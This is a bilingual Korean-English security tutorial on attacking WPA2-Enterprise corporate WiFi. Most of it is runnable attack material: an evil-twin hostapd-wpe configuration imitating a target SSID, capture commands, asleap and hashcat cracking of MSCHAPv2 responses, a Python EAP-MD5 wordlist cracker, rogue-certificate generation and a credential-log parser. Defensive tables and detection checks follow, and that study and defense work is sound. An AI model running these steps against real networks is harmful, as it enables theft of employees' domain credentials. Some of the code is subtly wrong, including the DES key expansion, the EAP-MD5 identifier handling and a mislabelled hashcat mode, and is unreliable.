> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 기업 WiFi 공격 (WPA2-Enterprise / RADIUS)

## 0. 초보자를 위한 개념 이해

### WPA2-Enterprise란?

WPA2-Enterprise는 가정용 PSK(사전 공유 키) 대신 RADIUS 서버를 통해 사용자별로 인증하는 기업용 WiFi 보안 방식입니다. 각 직원이 개별 계정(아이디/패스워드 또는 인증서)으로 로그인하므로, 한 사람이 퇴사해도 전체 WiFi 패스워드를 바꿀 필요가 없습니다. 하지만 EAP(확장 인증 프로토콜) 구현 방식에 따라 인증서 검증 미설정 시 Evil Twin 공격으로 도메인 자격증명이 탈취될 수 있습니다.

**왜 배우는가:**
```
WPA2-Enterprise 공격의 가치:

  일반 WiFi 크래킹           WPA2-Enterprise 공격
  ─────────────────────────────────────────────────
  WiFi 패스워드 획득          도메인 사용자 자격증명 획득
  인터넷 접속 가능            Active Directory 침투 가능
  로컬 네트워크 접속          전체 기업 내부 시스템 접근

  PEAP/EAP-TTLS + 인증서 미검증 설정 → 
  Evil Twin AP에 연결 →
  MSCHAPv2 챌린지-응답 캡처 →
  오프라인 패스워드 크래킹 →
  도메인 자격증명 탈취
```

### 핵심 개념 정리

```
WPA2-Enterprise 주요 EAP 타입:

  EAP 타입       인증 방식         주요 취약점
  ─────────────────────────────────────────────
  EAP-MD5       MD5 챌린지-응답   오프라인 크래킹
  PEAP          TLS + MSCHAPv2    인증서 미검증 → MITM
  EAP-TTLS      TLS + 내부 인증   인증서 미검증 → MITM
  EAP-TLS       상호 인증서       클라이언트 인증서 필요
  EAP-FAST      PAC 기반          PAC 탈취 공격

공격 도구:
  hostapd-wpe   — Evil Twin AP + EAP 자격증명 수집
  eaphammer     — WPA2-Enterprise 공격 자동화
  asleap        — MSCHAPv2 → 패스워드 오프라인 크랙
```

### 필요한 도구 및 환경
- **hostapd-wpe**: WPA2-Enterprise Evil Twin AP 구성 도구
- **freeradius-wpe**: 가짜 RADIUS 서버 (자격증명 수집)
- **asleap**: MSCHAPv2 챌린지-응답 크래킹 도구
- **무선 랜카드 AP 모드 지원**: Intel 칩셋 또는 Alfa 외장형

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""MSCHAPv2 패스워드 약점 분석 — 챌린지-응답 구조 이해."""

import hashlib
import hmac
import os
import struct


def des_encrypt(key_56bit: bytes, data: bytes) -> bytes:
    """56비트 DES 키로 8바이트 데이터를 암호화 (MSCHAPv2 핵심)."""
    from Crypto.Cipher import DES
    # 56비트 키를 64비트 DES 키로 변환 (패리티 비트 삽입)
    key_64bit = bytearray(8)
    for i in range(7):
        key_64bit[i] = key_56bit[i] >> i | ((key_56bit[i + 1] if i + 1 < 7 else 0) << (7 - i)) & 0xFF
    key_64bit[7] = key_56bit[6] << 1 & 0xFF
    cipher = DES.new(bytes(key_64bit), DES.MODE_ECB)
    return cipher.encrypt(data)


def nt_hash(password: str) -> bytes:
    """NT Hash = MD4(UTF-16LE 인코딩된 패스워드)."""
    from Crypto.Hash import MD4
    pw_bytes = password.encode("utf-16-le")
    return MD4.new(pw_bytes).digest()


def explain_mschapv2_weakness(password: str, challenge: bytes) -> dict:
    """MSCHAPv2의 취약점 — 3개의 독립 DES 사용으로 각각 브루트포스 가능."""
    nt = nt_hash(password)
    # NT Hash (16바이트)를 3개 DES 키로 분할 (21바이트 = 패딩 5바이트 추가)
    padded = nt + b"\x00" * 5
    return {
        "nt_hash":        nt.hex(),
        "des_key1_bytes": 7,  # 각 DES 키는 7바이트 = 56비트
        "des_key2_bytes": 7,
        "des_key3_bytes": 7,
        "vulnerability":  "각 DES 키를 독립적으로 브루트포스 가능 (2^56 × 3회)",
        "practical_attack": "GPU로 수 시간 내 크래킹 가능",
    }


if __name__ == "__main__":
    info = explain_mschapv2_weakness("Password1", os.urandom(8))
    print("[MSCHAPv2 취약점 분석]")
    for k, v in info.items():
        print(f"  {k}: {v}")
```

---

## 개요

WPA2-Enterprise는 개인 PSK 대신 RADIUS 서버를 통한 개별 사용자 인증을 사용한다. EAP(Extensible Authentication Protocol)를 기반으로 하며, EAP 타입에 따라 다양한 공격 벡터가 존재한다.

---

## EAP 프로토콜 구조

```
클라이언트(Supplicant) ←→ AP(Authenticator) ←→ RADIUS 서버
       EAP over LAN (EAPOL)        RADIUS 프로토콜
```

### 주요 EAP 타입

| EAP 타입 | 인증 방식 | 취약점 |
|----------|-----------|--------|
| EAP-MD5 | 챌린지-응답 (MD5) | 오프라인 크래킹 가능 |
| PEAP | TLS 터널 + MSCHAPv2 | 가짜 AP로 MSCHAPv2 획득 |
| EAP-TTLS | TLS 터널 + 다양한 내부 인증 | 인증서 검증 없으면 MITM |
| EAP-TLS | 상호 인증서 기반 | 클라이언트 인증서 필요 |
| EAP-FAST | PAC 기반 | PAC 탈취 공격 |

---

## 공격 1: 가짜 AP (Evil Twin) 구성

### hostapd-wpe 설치

```bash
# Kali Linux에서
apt-get install hostapd-wpe

# 또는 소스에서 빌드
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
# 패치 적용 후 빌드
```

### hostapd-wpe 설정 파일 작성

```ini
# /etc/hostapd-wpe/hostapd-wpe.conf

# 네트워크 인터페이스 (모니터 모드 지원 필요)
interface=wlan0

# 드라이버
driver=nl80211

# SSID (대상 기업 WiFi 이름과 동일하게)
ssid=TargetCorpWiFi

# 채널 (대상 AP와 동일하게)
channel=6

# WPA2-Enterprise 설정
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1

# EAP 모듈 설정
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user

# 인증서 설정 (자체 서명 CA)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# WPA2 설정
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# 로그 파일
wpe_logfile=/tmp/wpe.log
```

### eap_user 파일 설정

```
# /etc/hostapd-wpe/hostapd.eap_user
# EAP 방법 허용 목록

"*"  PEAP,TTLS,TLS,FAST
"*"  MSCHAPV2,MD5,GTC,OTP,SIM,LEAP  [2]
```

### 가짜 AP 실행

```bash
# 무선 인터페이스를 모니터 모드로 전환
airmon-ng start wlan0

# 기존 AP와 같은 BSSID/채널로 실행
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 로그 모니터링
tail -f /tmp/wpe.log
```

---

## 공격 2: MSCHAPv2 크래킹

### wpe.log에서 MSCHAPv2 챌린지-응답 추출

```
# 전형적인 wpe.log 출력 형식
mschapv2: Fri Jan 01 12:00:00 2025
	 username:	johndoe
	 challenge:	2f:3a:8c:1d:5e:7b:9f:00
	 response:	4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f
```

### asleap으로 오프라인 크래킹

```bash
# asleap 설치
apt-get install asleap

# 사전 기반 크래킹
asleap -C CHALLENGE_HEX -R RESPONSE_HEX -W /usr/share/wordlists/rockyou.txt

# 예시
asleap \
  -C 2f:3a:8c:1d:5e:7b:9f:00 \
  -R 4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f \
  -W /usr/share/wordlists/rockyou.txt
```

### hashcat으로 NetNTLMv2 크래킹

```bash
# MSCHAPv2 해시 형식: username:::challenge:response:
echo "johndoe:::2f3a8c1d5e7b9f00:4a1b8c2d3e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f:" > hash.txt

# hashcat Mode 5500 (NetNTLMv1) 또는 Mode 5600 (NetNTLMv2)
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# GPU 사용 시
hashcat -m 5500 -d 1 hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

## 공격 3: EAP-MD5 오프라인 크래킹

### 패킷 캡처

```bash
# 모니터 모드 활성화
airmon-ng start wlan0
airodump-ng wlan0mon --bssid TARGET_BSSID -c 6 -w eap_capture

# 특정 클라이언트 EAP 트래픽 필터링
tshark -r eap_capture.pcap -Y "eap" -T fields \
  -e eap.identity \
  -e eap.md5.value \
  -e eap.challenge
```

### Python EAP-MD5 크래커

```python
import hashlib
import struct

def crack_eap_md5(
    identity: str,
    challenge: bytes,
    response: bytes,
    wordlist_path: str,
) -> str | None:
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            # EAP-MD5: MD5(id || password || challenge)
            # id는 EAP 패킷의 Identifier 필드
            computed = hashlib.md5(
                b"\x01" + password.encode() + challenge
            ).digest()
            if computed == response:
                return password
    return None
```

---

## 공격 4: PEAP 인증서 검증 우회

인증서 검증을 안 하는 클라이언트(Windows 기본값 미설정)는 가짜 인증서를 수락한다.

### 자체 서명 인증서 생성

```bash
# CA 키 및 인증서 생성
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key \
  -out ca.pem -subj "/CN=Evil Corp CA"

# 서버 키 및 CSR 생성
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/CN=radius.targetcorp.com"

# CA로 서버 인증서 서명
openssl x509 -req -days 365 \
  -in server.csr -CA ca.pem -CAkey ca.key \
  -CAcreateserial -out server.pem

# DH 파라미터 생성
openssl dhparam -out dh 2048
```

---

## Python 자동화: RADIUS 로그 파서

```python
#!/usr/bin/env python3
"""
WPE Log Parser - hostapd-wpe 로그에서 크리덴셜 추출
사용법: python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt
"""

import argparse
import re
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class MSCHAPv2Credential:
    username: str
    challenge: str
    response: str

    def to_hashcat(self) -> str:
        challenge_clean = self.challenge.replace(":", "")
        response_clean = self.response.replace(":", "")
        return f"{self.username}:::{challenge_clean}:{response_clean}:"

    def to_asleap(self) -> str:
        return f"asleap -C {self.challenge} -R {self.response} -W rockyou.txt"


def parse_wpe_log(log_path: Path) -> list[MSCHAPv2Credential]:
    credentials: list[MSCHAPv2Credential] = []

    content = log_path.read_text(errors="ignore")

    # mschapv2 블록 파싱
    pattern = re.compile(
        r"mschapv2:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )

    for match in pattern.finditer(content):
        username, challenge, response = match.groups()
        cred = MSCHAPv2Credential(
            username=username.strip(),
            challenge=challenge.strip(),
            response=response.strip(),
        )
        # 중복 제거
        if cred not in credentials:
            credentials.append(cred)

    # EAP-MD5 블록 파싱
    md5_pattern = re.compile(
        r"eap-md5:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )
    # EAP-MD5는 별도 처리 (생략)

    return credentials


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPE Log Parser - hostapd-wpe 크리덴셜 추출",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 wpe_parser.py --log /tmp/wpe.log
  python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt --format hashcat
        """,
    )
    parser.add_argument("--log", required=True, type=Path, help="wpe.log 파일 경로")
    parser.add_argument("--output", type=Path, help="출력 파일 (기본: 표준출력)")
    parser.add_argument(
        "--format",
        choices=["hashcat", "asleap", "both"],
        default="hashcat",
        help="출력 형식 (기본: hashcat)",
    )

    args = parser.parse_args()

    if not args.log.exists():
        print(f"[-] 파일을 찾을 수 없음: {args.log}", file=sys.stderr)
        sys.exit(1)

    credentials = parse_wpe_log(args.log)

    if not credentials:
        print("[-] 추출된 크리덴셜 없음", file=sys.stderr)
        sys.exit(1)

    print(f"[+] 추출된 MSCHAPv2 크리덴셜: {len(credentials)}개")

    output_lines: list[str] = []
    for cred in credentials:
        print(f"  [*] 사용자: {cred.username}")

        if args.format in ("hashcat", "both"):
            line = cred.to_hashcat()
            print(f"      Hashcat: {line}")
            output_lines.append(line)

        if args.format in ("asleap", "both"):
            line = cred.to_asleap()
            print(f"      asleap:  {line}")
            if args.format == "asleap":
                output_lines.append(line)

    if args.output:
        args.output.write_text("\n".join(output_lines) + "\n")
        print(f"\n[+] 크리덴셜 저장: {args.output}")
        print(f"    hashcat 실행: hashcat -m 5500 {args.output} wordlist.txt")


if __name__ == "__main__":
    main()
```

---

## 방어 대책

| 취약점 | 방어 방법 |
|--------|-----------|
| 가짜 AP | 클라이언트에서 서버 인증서 검증 필수화 |
| MSCHAPv2 크래킹 | EAP-TLS(인증서 기반)으로 전환 |
| EAP-MD5 | 사용 금지, PEAP/EAP-TLS로 교체 |
| 인증서 미검증 | CA 핀닝, 도메인 검증 설정 |
| 가짜 AP 탐지 | WIDS(무선 침입 탐지) 시스템 도입 |

### Windows 클라이언트 인증서 검증 강제 설정

```powershell
# GPO 또는 netsh로 인증서 검증 활성화
netsh wlan set profileparameter name="CorpWiFi" `
  authMode=machineOrUser

# 인증서 서버 검증 활성화 (레지스트리)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP\25" `
  -Name "ServerCertificate" -Value 1
```

---

<!-- detect-validate-15 -->
## 공격 탐지와 방어 검증

엔터프라이즈 WiFi(WPA-Enterprise/802.1X)는 *RADIUS 인증*에 의존한다. 공격은 가짜 AP+가짜 RADIUS로 자격증명(특히 MSCHAPv2)을 가로채는 데 집중한다. 방어자는 **서버 인증서 검증**이 강제되는지, **공격이 탐지되는지** 검증해야 한다. 실습은 **소유·허가된 망**에서만.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 이블트윈 + 가짜 RADIUS | 서버 인증서 미검증 | CA 고정, 인증서 검증 강제 | 동일 SSID 다른 RADIUS |
| MSCHAPv2 챌린지 탈취 | 약한 EAP 방식 | EAP-TLS(상호 인증) | 비정상 인증 실패 후 성공 |
| 자격증명 릴레이 | PEAP 내부 신뢰 | 클라 프로파일 강제 | 새 RADIUS로 인증 시도 |
| 다운그레이드 유도 | 약한 EAP 허용 | 강한 EAP만 허용 | 비표준 EAP 협상 |

### 방어 검증 (직접 확인)

```bash
# 클라이언트가 서버 인증서를 실제 검증하는지 확인(미검증이면 이블트윈에 자격증명 누설)
# 가짜 RADIUS(hostapd-wpe)를 통제 환경에 세우고, 클라가 경고 없이 붙으면 설정 취약
echo "클라 프로파일: 'CA 인증서 검증' + '서버 이름 일치' 강제 여부 확인"
# RADIUS 로그에서 비정상 인증 실패→타 서버 성공 패턴 모니터
grep -i "Access-Reject\|Access-Accept" /var/log/freeradius/radius.log | tail
```

> 엔터프라이즈 WiFi의 보안은 *클라이언트의 서버 인증서 검증*에 달려 있다 — 이게 꺼져 있으면 EAP-TLS가 아닌 한 가짜 RADIUS에 자격증명을 그대로 넘긴다. hostapd-wpe로 통제 환경에서 클라 설정이 견디는지 검증해야 한다([[54_Active_Directory_Attacks]], [[16_Cryptography]]).

---

<a name="english"></a>

# Enterprise WiFi Attacks (WPA2-Enterprise / RADIUS)

## Overview

WPA2-Enterprise uses per-user authentication via a RADIUS server instead of a shared PSK. It is based on EAP (Extensible Authentication Protocol), and various attack vectors exist depending on the EAP type in use.

---

## EAP Protocol Structure

```
Client (Supplicant) <-> AP (Authenticator) <-> RADIUS Server
       EAP over LAN (EAPOL)        RADIUS Protocol
```

### Key EAP Types

| EAP Type | Authentication Method | Vulnerability |
|----------|-----------------------|---------------|
| EAP-MD5 | Challenge-response (MD5) | Offline cracking possible |
| PEAP | TLS tunnel + MSCHAPv2 | Obtain MSCHAPv2 via rogue AP |
| EAP-TTLS | TLS tunnel + various inner auth | MITM if no cert validation |
| EAP-TLS | Mutual certificate-based | Client certificate required |
| EAP-FAST | PAC-based | PAC theft attack |

---

## Attack 1: Rogue AP (Evil Twin) Setup

### Installing hostapd-wpe

```bash
# On Kali Linux
apt-get install hostapd-wpe

# Or build from source
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
# Apply patches then build
```

### Writing the hostapd-wpe Configuration File

```ini
# /etc/hostapd-wpe/hostapd-wpe.conf

# Network interface (must support monitor mode)
interface=wlan0

# Driver
driver=nl80211

# SSID (match the target corporate WiFi name)
ssid=TargetCorpWiFi

# Channel (match the target AP)
channel=6

# WPA2-Enterprise settings
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1

# EAP module settings
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user

# Certificate settings (self-signed CA)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# WPA2 settings
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# Log file
wpe_logfile=/tmp/wpe.log
```

### eap_user File Configuration

```
# /etc/hostapd-wpe/hostapd.eap_user
# Allowed EAP methods

"*"  PEAP,TTLS,TLS,FAST
"*"  MSCHAPV2,MD5,GTC,OTP,SIM,LEAP  [2]
```

### Starting the Rogue AP

```bash
# Switch wireless interface to monitor mode
airmon-ng start wlan0

# Run with the same BSSID/channel as the legitimate AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Monitor logs
tail -f /tmp/wpe.log
```

---

## Attack 2: MSCHAPv2 Cracking

### Extracting MSCHAPv2 Challenge-Response from wpe.log

```
# Typical wpe.log output format
mschapv2: Fri Jan 01 12:00:00 2025
	 username:	johndoe
	 challenge:	2f:3a:8c:1d:5e:7b:9f:00
	 response:	4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f
```

### Offline Cracking with asleap

```bash
# Install asleap
apt-get install asleap

# Dictionary-based cracking
asleap -C CHALLENGE_HEX -R RESPONSE_HEX -W /usr/share/wordlists/rockyou.txt

# Example
asleap \
  -C 2f:3a:8c:1d:5e:7b:9f:00 \
  -R 4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f \
  -W /usr/share/wordlists/rockyou.txt
```

### Cracking NetNTLMv2 with hashcat

```bash
# MSCHAPv2 hash format: username:::challenge:response:
echo "johndoe:::2f3a8c1d5e7b9f00:4a1b8c2d3e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f:" > hash.txt

# hashcat Mode 5500 (NetNTLMv1) or Mode 5600 (NetNTLMv2)
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# With GPU
hashcat -m 5500 -d 1 hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

## Attack 3: EAP-MD5 Offline Cracking

### Packet Capture

```bash
# Enable monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon --bssid TARGET_BSSID -c 6 -w eap_capture

# Filter EAP traffic for a specific client
tshark -r eap_capture.pcap -Y "eap" -T fields \
  -e eap.identity \
  -e eap.md5.value \
  -e eap.challenge
```

### Python EAP-MD5 Cracker

```python
import hashlib
import struct

def crack_eap_md5(
    identity: str,
    challenge: bytes,
    response: bytes,
    wordlist_path: str,
) -> str | None:
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            # EAP-MD5: MD5(id || password || challenge)
            # id is the Identifier field in the EAP packet
            computed = hashlib.md5(
                b"\x01" + password.encode() + challenge
            ).digest()
            if computed == response:
                return password
    return None
```

---

## Attack 4: Bypassing PEAP Certificate Validation

Clients that do not validate the server certificate (Windows default when unconfigured) will accept a rogue certificate.

### Generating a Self-Signed Certificate

```bash
# Generate CA key and certificate
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key \
  -out ca.pem -subj "/CN=Evil Corp CA"

# Generate server key and CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/CN=radius.targetcorp.com"

# Sign server certificate with CA
openssl x509 -req -days 365 \
  -in server.csr -CA ca.pem -CAkey ca.key \
  -CAcreateserial -out server.pem

# Generate DH parameters
openssl dhparam -out dh 2048
```

---

## Python Automation: RADIUS Log Parser

```python
#!/usr/bin/env python3
"""
WPE Log Parser - Extract credentials from hostapd-wpe logs
Usage: python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt
"""

import argparse
import re
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class MSCHAPv2Credential:
    username: str
    challenge: str
    response: str

    def to_hashcat(self) -> str:
        challenge_clean = self.challenge.replace(":", "")
        response_clean = self.response.replace(":", "")
        return f"{self.username}:::{challenge_clean}:{response_clean}:"

    def to_asleap(self) -> str:
        return f"asleap -C {self.challenge} -R {self.response} -W rockyou.txt"


def parse_wpe_log(log_path: Path) -> list[MSCHAPv2Credential]:
    credentials: list[MSCHAPv2Credential] = []

    content = log_path.read_text(errors="ignore")

    # Parse mschapv2 blocks
    pattern = re.compile(
        r"mschapv2:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )

    for match in pattern.finditer(content):
        username, challenge, response = match.groups()
        cred = MSCHAPv2Credential(
            username=username.strip(),
            challenge=challenge.strip(),
            response=response.strip(),
        )
        # Deduplicate
        if cred not in credentials:
            credentials.append(cred)

    return credentials


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPE Log Parser - Extract hostapd-wpe credentials",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 wpe_parser.py --log /tmp/wpe.log
  python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt --format hashcat
        """,
    )
    parser.add_argument("--log", required=True, type=Path, help="Path to wpe.log file")
    parser.add_argument("--output", type=Path, help="Output file (default: stdout)")
    parser.add_argument(
        "--format",
        choices=["hashcat", "asleap", "both"],
        default="hashcat",
        help="Output format (default: hashcat)",
    )

    args = parser.parse_args()

    if not args.log.exists():
        print(f"[-] File not found: {args.log}", file=sys.stderr)
        sys.exit(1)

    credentials = parse_wpe_log(args.log)

    if not credentials:
        print("[-] No credentials extracted", file=sys.stderr)
        sys.exit(1)

    print(f"[+] MSCHAPv2 credentials extracted: {len(credentials)}")

    output_lines: list[str] = []
    for cred in credentials:
        print(f"  [*] User: {cred.username}")

        if args.format in ("hashcat", "both"):
            line = cred.to_hashcat()
            print(f"      Hashcat: {line}")
            output_lines.append(line)

        if args.format in ("asleap", "both"):
            line = cred.to_asleap()
            print(f"      asleap:  {line}")
            if args.format == "asleap":
                output_lines.append(line)

    if args.output:
        args.output.write_text("\n".join(output_lines) + "\n")
        print(f"\n[+] Credentials saved: {args.output}")
        print(f"    Run hashcat: hashcat -m 5500 {args.output} wordlist.txt")


if __name__ == "__main__":
    main()
```

---

## Defenses

| Vulnerability | Defense |
|---------------|---------|
| Rogue AP | Enforce server certificate validation on clients |
| MSCHAPv2 cracking | Migrate to EAP-TLS (certificate-based) |
| EAP-MD5 | Disable; replace with PEAP/EAP-TLS |
| No certificate validation | CA pinning, domain validation configuration |
| Rogue AP detection | Deploy WIDS (Wireless Intrusion Detection System) |

### Forcing Certificate Validation on Windows Clients

```powershell
# Enable certificate validation via GPO or netsh
netsh wlan set profileparameter name="CorpWiFi" `
  authMode=machineOrUser

# Enable server certificate validation (registry)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP\25" `
  -Name "ServerCertificate" -Value 1
```
